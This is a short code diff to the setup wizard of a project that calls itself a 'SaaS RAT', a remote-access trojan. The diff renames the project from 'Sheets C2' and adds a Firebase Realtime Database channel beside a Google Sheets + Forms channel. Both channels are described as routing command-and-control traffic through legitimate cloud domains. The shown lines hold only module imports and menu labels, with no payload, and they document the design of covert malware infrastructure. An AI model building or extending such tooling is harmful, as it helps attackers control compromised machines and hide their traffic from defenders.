@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-setup_wizard.py — interactive setup wizard for Sheets C2
+setup_wizard.py — interactive setup wizard for SaaS RAT
 
 Usage:
     python setup_wizard.py
@@ -21,6 +21,7 @@ def _build_registries():
     from wizard.fragmenter.passthrough import PassthroughWizard
     from wizard.fragmenter.fixed import FixedWizard
     from wizard.channel.sheets import SheetsWizard
+    from wizard.channel.firebase import FirebaseWizard
 
     return {
         "crypto": {
@@ -32,7 +33,8 @@ def _build_registries():
             "fixed":       ("Fixed-size chunks — one fragment per poll cycle",   FixedWizard),
         },
         "channel": {
-            "sheets": ("Google Sheets + Forms", SheetsWizard),
+            "sheets":   ("Google Sheets + Forms — C2 traffic via docs.google.com", SheetsWizard),
+            "firebase": ("Firebase Realtime Database — C2 traffic via firebaseio.com", FirebaseWizard),
         },
     }
 
